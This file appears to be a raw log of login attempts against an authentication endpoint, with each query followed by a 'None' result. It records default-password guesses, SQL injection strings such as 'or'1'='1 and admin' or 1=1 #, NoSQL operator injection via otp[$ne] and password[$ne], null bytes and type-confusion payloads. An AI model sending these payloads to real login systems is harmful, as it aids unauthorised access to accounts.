+Query: {'username': u'admin', 'auth': {u'otp': u'1212`1', u'password': u'123445'}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'ssgsd', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234556', u'password': u'guest'}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {}}
+None
+Query: {'username': u'admin', 'auth': {u'password': 1}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'1234'}}
+None
+Query: {'username': u'test', 'auth': {u'otp': u'11111', u'password': u'test'}}
+None
+Query: {'username': u'1e2ewwew', 'auth': {u'otp': u'11111', u'password': u'test'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'11111', u'password': u'test'}}
+None
+Query: {'username': u'', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'1', 'auth': {u'otp': u'', u'password': u'1'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'guest'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'guest'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u''}}
+None
+Query: {'username': u'admin', 'auth': 1}
+None
+Query: {'username': u'admin', 'auth': 1}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'~'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'!'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'@'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'#'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'^'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'&'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'server.py'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'('}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u')'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'_'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'+'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'{'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'|'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u':'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'<'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'>'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'?'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'/'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'.'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u','}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u';'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u']'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'['}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'='}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'`'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%00'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%01'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%02'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%03'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%04'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%05'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%06'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%07'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%08'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%09'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0a'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0b'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0c'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0d'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0e'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0f'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'='"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'or'1'='1"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'or'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'1=1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%23'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'@@'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'^^'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%%'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'?-s'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'?-h'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-h'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-d'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'&&'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'||'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'|'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'&'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'<!--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'//'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$$'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$_'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'[]['}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'[]'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'[]]'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'][]'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u']['}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%s'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%h'}}
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-v'}}
+None
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'^='}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'+='}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u';;'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"';"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"':'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-s'}}
+None
+Query: {'username': u'admin', 'auth': 1}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'~'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'!'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'@'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'#'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'^'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'&'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'server.py'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'('}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u')'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'_'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'+'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'{'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'|'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u':'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'<'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'>'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'/'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'?'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u','}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u';'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u']'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'['}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'='}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'`'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%00'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%01'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%02'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%03'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%04'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%05'}}
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%06'}}
+None
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%07'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%08'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%09'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0a'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0b'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0c'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0d'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0e'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%0f'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'='"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'or'1'='1"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'or'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'1=1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%23'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'@@'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'^^'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%%'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'?-s'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'?-h'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-h'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-s'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-d'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'&&'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'||'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'|'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'&'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'<!--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'//'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$$'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$_'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'[]['}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'[]'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'[]]'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'.'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'][]'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u']['}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%s'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%h'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-v'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'^='}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'+='}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u';;'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"';"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"':'"}}
+None
+Query: {'username': u'admin', 'auth': 1}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'~'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'!'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'@'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'#'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'^'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'('}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'server.py'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u')'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'_'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u' '}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'{'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'}'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'|'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u':'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'<'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'>'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'?'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'/'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'.'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u','}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u';'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u']'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'['}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'='}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'`'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'='"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'or'1'='1"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'or'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'1=1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'#'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'@@'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'^^'}}
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%%'}}
+None
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'?-s'}}
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'?-h'}}
+None
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-h'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-s'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-d'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'||'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"'|'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'//'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$$'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$1'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'$_'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'[]['}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'[]'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'[]]'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'][]'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u']['}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%s'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'%h'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'-v'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'^='}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"';"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u"':'"}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u'<!--'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u' ='}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'', u'password': u';;'}}
+None
+Query: {'username': u'admin', 'auth': 1}
+None
+Query: {'username': u'guest', 'auth': 1}
+None
+Query: {'username': u'admin', 'auth': 1}
+None
+Query: {'username': u'admin    ', 'auth': 1}
+None
+Query: {'username': u"admin'", 'auth': 1}
+None
+Query: {'username': u'admin"', 'auth': 1}
+None
+Query: {'username': u'admin1', 'auth': 1}
+None
+Query: {'username': u'admin~', 'auth': 1}
+None
+Query: {'username': u'admin!', 'auth': 1}
+None
+Query: {'username': u'admin@', 'auth': 1}
+None
+Query: {'username': u'admin#', 'auth': 1}
+None
+Query: {'username': u'admin$', 'auth': 1}
+None
+Query: {'username': u'admin%', 'auth': 1}
+None
+Query: {'username': u'admin^', 'auth': 1}
+None
+Query: {'username': u'admin', 'auth': 1}
+None
+Query: {'username': u'admin*', 'auth': 1}
+None
+Query: {'username': u'admin(', 'auth': 1}
+None
+Query: {'username': u'admin)', 'auth': 1}
+None
+Query: {'username': u'admin_', 'auth': 1}
+None
+Query: {'username': u'admin ', 'auth': 1}
+None
+Query: {'username': u'admin{', 'auth': 1}
+None
+Query: {'username': u'admin}', 'auth': 1}
+None
+Query: {'username': u'admin:', 'auth': 1}
+None
+Query: {'username': u'admin|', 'auth': 1}
+None
+Query: {'username': u'admin"', 'auth': 1}
+None
+Query: {'username': u'admin<', 'auth': 1}
+None
+Query: {'username': u'admin>', 'auth': 1}
+None
+Query: {'username': u'admin?', 'auth': 1}
+None
+Query: {'username': u'admin/', 'auth': 1}
+None
+Query: {'username': u'admin.', 'auth': 1}
+None
+Query: {'username': u'admin,', 'auth': 1}
+None
+Query: {'username': u"admin'", 'auth': 1}
+None
+Query: {'username': u'admin;', 'auth': 1}
+None
+Query: {'username': u'admin]', 'auth': 1}
+None
+Query: {'username': u'admin\\', 'auth': 1}
+None
+Query: {'username': u'admin[', 'auth': 1}
+None
+Query: {'username': u'admin=', 'auth': 1}
+None
+Query: {'username': u'admin-', 'auth': 1}
+None
+Query: {'username': u'admin`', 'auth': 1}
+None
+Query: {'username': u'admin', 'auth': 1}
+None
+Query: {'username': u'admin', 'auth': 1}
+None
+Query: {'username': u'admin\x00', 'auth': 1}
+None
+Query: {'username': u'admin\x01', 'auth': 1}
+None
+Query: {'username': u'admin\x02', 'auth': 1}
+None
+Query: {'username': u'admin\x03', 'auth': 1}
+None
+Query: {'username': u'admin\x06', 'auth': 1}
+None
+Query: {'username': u'admin\x05', 'auth': 1}
+None
+Query: {'username': u'admin\x07', 'auth': 1}
+None
+Query: {'username': u'admin\t', 'auth': 1}
+None
+Query: {'username': u'admin\n', 'auth': 1}
+None
+Query: {'username': u'admin\x0b', 'auth': 1}
+None
+Query: {'username': u'admin\x0e', 'auth': 1}
+None
+Query: {'username': u'admin\x0f', 'auth': 1}
+None
+Query: {'username': u'admin-- -', 'auth': 1}
+None
+Query: {'username': u"admin' -- -", 'auth': 1}
+None
+Query: {'username': u'admin" -- -', 'auth': 1}
+None
+Query: {'username': u'admin") -- -', 'auth': 1}
+None
+Query: {'username': u"admin'='", 'auth': 1}
+None
+Query: {'username': u"admin'or'1'='1", 'auth': 1}
+None
+Query: {'username': u"admin' or 1=1 #", 'auth': 1}
+None
+Query: {'username': u'admin\'"', 'auth': 1}
+None
+Query: {'username': u'admin@@', 'auth': 1}
+None
+Query: {'username': u'admin^^', 'auth': 1}
+None
+Query: {'username': u'admin\x04', 'auth': 1}
+None
+Query: {'username': u'admin%%', 'auth': 1}
+None
+Query: {'username': u'admin\\x', 'auth': 1}
+None
+Query: {'username': u'admin\\x00', 'auth': 1}
+None
+Query: {'username': u'admin\\x08', 'auth': 1}
+None
+Query: {'username': u'admin?-s', 'auth': 1}
+None
+Query: {'username': u'admin?-h', 'auth': 1}
+None
+Query: {'username': u'admin\r', 'auth': 1}
+Query: {'username': u'admin\x0c', 'auth': 1}
+None
+None
+Query: {'username': u'admin-h', 'auth': 1}
+None
+Query: {'username': u'admin-s', 'auth': 1}
+None
+Query: {'username': u'admin-d', 'auth': 1}
+None
+Query: {'username': u'admin', 'auth': 1}
+None
+Query: {'username': u'admin||', 'auth': 1}
+None
+Query: {'username': u"admin'|'", 'auth': 1}
+None
+Query: {'username': u"admin'", 'auth': 1}
+None
+Query: {'username': u'admin">">', 'auth': 1}
+None
+Query: {'username': u'admin<"<"', 'auth': 1}
+None
+Query: {'username': u'admin<!--', 'auth': 1}
+None
+Query: {'username': u'admin//', 'auth': 1}
+None
+Query: {'username': u'admin$$', 'auth': 1}
+None
+Query: {'username': u'admin$1', 'auth': 1}
+None
+Query: {'username': u'admin$_', 'auth': 1}
+None
+Query: {'username': u'admin\x08', 'auth': 1}
+None
+Query: {'username': u'admin[][', 'auth': 1}
+None
+Query: {'username': u'admin[]', 'auth': 1}
+None
+Query: {'username': u'admin[]]', 'auth': 1}
+None
+Query: {'username': u'admin][]', 'auth': 1}
+None
+Query: {'username': u'admin%s', 'auth': 1}
+None
+Query: {'username': u'admin][', 'auth': 1}
+None
+Query: {'username': u'admin%h', 'auth': 1}
+None
+Query: {'username': u'admin^=', 'auth': 1}
+None
+Query: {'username': u'admin-v', 'auth': 1}
+None
+Query: {'username': u'admin =', 'auth': 1}
+None
+Query: {'username': u'admin;;', 'auth': 1}
+None
+Query: {'username': u"admin';", 'auth': 1}
+None
+Query: {'username': u'admin";', 'auth': 1}
+None
+Query: {'username': u"admin':'", 'auth': 1}
+None
+Query: {'username': u'admin">', 'auth': 1}
+None
+Query: {'username': u'test', 'auth': {u'otp': u'', u'password': u'test'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'123456'}}
+None
+Query: {'username': u'123', 'auth': {u'otp': u'123', u'password': u'123'}}
+None
+Query: {'username': u'123', 'auth': {u'otp': u'123', u'password': u'123'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'1234', u'password': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp[$ne]': u'123', u'password[$ne]': u'admin'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp[$ne]': u'123', u'password[$ne]': u'admin'}}
+None
+Query: {'username': u'admin', 'auth': {u'otp': u'123', u'password[$ne]': u'admin'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'1234', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'guest'}}
+None
+Query: {'username': u'guest', 'auth': {u'otp': u'', u'password': u'123456'}}
+None
